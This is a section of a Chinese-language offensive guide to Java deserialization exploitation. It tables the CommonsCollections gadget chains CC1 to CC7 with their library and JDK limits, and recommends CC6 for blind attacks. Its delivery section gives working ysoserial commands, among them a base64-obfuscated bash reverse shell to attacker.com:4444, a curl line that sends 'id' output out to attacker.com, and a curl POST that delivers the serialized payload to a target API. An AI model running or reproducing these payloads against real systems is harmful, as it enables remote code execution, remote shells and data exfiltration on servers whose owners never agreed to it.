## 四、CommonsCollections 全链与版本兼容矩阵

### 4.1 全链总表与兼容矩阵
| 链 | 入口触发 | 核心类 | commons-collections | JDK 限制 | 备注 |
|----|---------|--------|--------------------|---------|------|
| CC1 | `AnnotationInvocationHandler.readObject` → TransformedMap | `InvokerTransformer`+`ChainedTransformer` | 3.x | < 8u71（AIH 被限制） | 开山之作 |
| CC2 | `PriorityQueue.readObject` → `TransformingComparator` | `InvokerTransformer`+`TemplatesImpl` | 4.x | 无严格限制 | CC4 同源 |
| CC3 | `PriorityQueue`/`TrAXFilter` → `InstantiateTransformer` | `TrAXFilter`+`TemplatesImpl` | 3.x/4.x | 无严格限制 | 抛掉 AIH 依赖 |
| CC4 | `PriorityQueue` → `TransformingComparator` | `InstantiateTransformer`+`TemplatesImpl` | 4.x | 无严格限制 | |
| CC5 | `BadAttributeValueExpException.readObject` → `TiedMapEntry` | `ChainedTransformer`+`LazyMap` | 3.x | < 8u71 | |
| CC6 | `HashSet.readObject` → `TiedMapEntry.hashCode` | `LazyMap`+`TiedMapEntry`+`InvokerTransformer` | 3.x/4.x 通用 | JDK 7/8 全版本 | **最通用，首选** |
| CC7 | `Hashtable.readObject` → `LazyMap` | `LazyMap`+`AbstractMapDecorator` | 3.x | 8u71+ 可用 | 后 8u71 时代主力 |
| CC-TransformedMap 变体 | `TransformedMap.checkSetValue` | 同上 | 3.x | | 老变体 |
| CC-LazyMap 变体 | `LazyMap.get` | 同上 | 3.x/4.x | | 家族最多变体 |

### 4.2 选链原则
- **盲打首选 CC6**：对 commons-collections 3.x/4.x 双兼容、JDK 7/8 全版本，兼容性最好
- **高版本 JDK（8u71+）**：CC1/CC5 失效（`AnnotationInvocationHandler` 反序列化受限），用 CC6/CC7
- **4.x 环境**：CC2/CC4；**3.x 环境**：CC1/CC5/CC7
- **TemplatesImpl 终点变体**：CC2/CC3/CC4 的终点都是 `TemplatesImpl.newTransformer()`（详见第五章）

### 4.3 生成与投递
```bash
# 生成（命令注意跨平台：Linux 用 bash -c，Windows 用 cmd /c）
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' > cc6.ser
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' > cc1.ser
java -jar ysoserial.jar CommonsBeanutils1 'curl http://attacker.com/$(id|base64)' > cb1.ser
java -jar ysoserial.jar URLDNS 'http://xxx.dnslog.cn' > urldns.ser   # 无 RCE 探测

# Base64 投递（HTTP 参数）
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0
# 原始二进制投递
cat cc6.ser | curl -s -X POST -H 'Content-Type: application/x-java-serialized-object' --data-binary @- http://target/api
```

